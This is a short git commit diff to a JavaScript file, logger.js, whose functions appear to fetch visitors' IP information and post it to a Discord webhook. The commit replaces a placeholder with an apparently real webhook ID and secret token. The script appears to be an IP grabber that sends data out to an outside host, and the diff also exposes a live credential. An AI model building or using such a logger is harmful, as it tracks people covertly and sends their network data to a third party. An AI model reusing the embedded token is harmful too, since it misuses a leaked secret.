a25a6dffbde48c9fe4eecfda84728cec40c942b1
NotMine-eth <weoned18@gmail.com>
2025-06-03 17:41:54 -0600

    Update logger.js

--- logger.js
+++ logger.js
@@ -6,7 +6,7 @@ async function obtenerInfoIP() {
 }
 
 async function enviarInfoADiscord(info) {
-  const webhookURL = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN'; // Reemplaza con tu webhook
+  const webhookURL = 'https://discord.com/api/webhooks/1379598670550405290/r6g0SLry7T_R4QrIbW04u3CG06C6nqRVLsOzDeajGR6UTS6qmFcFZ3K7u-gvhAeJYubU'; // Reemplaza con tu webhook
 
   // Crear un mensaje bonito con la info:
   const mensaje = `
